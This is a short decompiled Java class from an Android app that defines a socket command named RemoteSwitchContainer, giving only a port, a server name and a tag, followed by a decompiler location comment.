package com.vvt.polymorphic.command;

import com.fx.socket.TcpSocketCmd;

public class RemoteSwitchContainer
  extends TcpSocketCmd
{
  private static final long serialVersionUID = 8256213877855736789L;
  
  public RemoteSwitchContainer()
  {
    super(null, Boolean.class);
  }
  
  protected int getPort()
  {
    return 12514;
  }
  
  protected String getServerName()
  {
    return "vvt.polymorphic.server";
  }
  
  protected String getTag()
  {
    return "RemoteSwitchContainer";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/polymorphic/command/RemoteSwitchContainer.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */